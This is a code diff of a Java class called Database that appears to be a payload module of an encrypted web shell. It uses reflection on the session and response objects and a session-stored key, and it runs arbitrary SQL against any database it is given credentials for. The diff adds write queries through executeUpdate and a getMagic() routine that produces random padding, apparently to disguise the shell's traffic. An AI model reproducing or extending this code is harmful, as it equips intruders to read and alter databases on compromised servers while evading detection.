@@ -10,7 +10,9 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.LinkedHashMap;
+import java.util.List;
 import java.util.Map;
+import java.util.Random;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 
@@ -47,6 +49,7 @@ public class Database {
                result.put("msg", "NoDriver");
                var13 = false;
             } else {
+               var17.printStackTrace();
                result.put("msg", var17.getMessage());
                var13 = false;
             }
@@ -110,47 +113,53 @@ public class Database {
       Class.forName(driver);
       Connection con = DriverManager.getConnection(url, user, pass);
       Statement statement = con.createStatement();
-      ResultSet rs = statement.executeQuery(sql);
-      ResultSetMetaData metaData = rs.getMetaData();
-      int count = metaData.getColumnCount();
-      String[] colNames = new String[count];
+      if (!sql.startsWith("update") && !sql.startsWith("insert")) {
+         ResultSet rs = statement.executeQuery(sql);
+         ResultSetMetaData metaData = rs.getMetaData();
+         int count = metaData.getColumnCount();
+         String[] colNames = new String[count];
 
-      for(int i = 0; i < count; ++i) {
-         colNames[i] = metaData.getColumnLabel(i + 1);
-      }
-
-      result = result + "[";
-      String[] var16 = colNames;
-      int var11 = colNames.length;
-
-      for(int var12 = 0; var12 < var11; ++var12) {
-         String col = var16[var12];
-         String colRecord = String.format("{\"name\":\"%s\"}", col);
-         result = result + colRecord + ",";
-      }
-
-      result = result.substring(0, result.length() - 1);
-      result = result + "],";
-      Map record = new LinkedHashMap();
-
-      for(ArrayList recordList = new ArrayList(); rs.next(); result = result + "],") {
-         result = result + "[";
-         String[] var19 = colNames;
-         int var20 = colNames.length;
-
-         for(int var21 = 0; var21 < var20; ++var21) {
-            String col = var19[var21];
-            record.put(col, rs.getObject(col));
-            result = result + "\"" + rs.getObject(col) + "\",";
+         for(int i = 0; i < count; ++i) {
+            colNames[i] = metaData.getColumnLabel(i + 1);
          }
 
-         recordList.add(record);
+         result = result + "[";
+         String[] var17 = colNames;
+         int var11 = colNames.length;
+
+         for(int var12 = 0; var12 < var11; ++var12) {
+            String col = var17[var12];
+            String colRecord = String.format("{\"name\":\"%s\"}", col);
+            result = result + colRecord + ",";
+         }
+
          result = result.substring(0, result.length() - 1);
+         result = result + "],";
+         Map record = new LinkedHashMap();
+
+         for(List recordList = new ArrayList(); rs.next(); result = result + "],") {
+            result = result + "[";
+            String[] var20 = colNames;
+            int var21 = colNames.length;
+
+            for(int var22 = 0; var22 < var21; ++var22) {
+               String col = var20[var22];
+               record.put(col, rs.getObject(col));
+               result = result + "\"" + rs.getObject(col) + "\",";
+            }
+
+            recordList.add(record);
+            result = result.substring(0, result.length() - 1);
+         }
+
+         result = result.substring(0, result.length() - 1);
+         result = result + "]";
+         rs.close();
+      } else {
+         int rows = statement.executeUpdate(sql);
+         result = result + "[{\"name\":\"RowsEffected\"}],[\"" + rows + "\"]]";
       }
 
-      result = result.substring(0, result.length() - 1);
-      result = result + "]";
-      rs.close();
       con.close();
       return result;
    }
@@ -217,5 +226,18 @@ public class Database {
       }
 
       this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+   }
+
+   private byte[] getMagic() throws Exception {
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
+      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
+      Random random = new Random();
+      byte[] buf = new byte[magicNum];
+
+      for(int i = 0; i < buf.length; ++i) {
+         buf[i] = (byte)random.nextInt(256);
+      }
+
+      return buf;
    }
 }
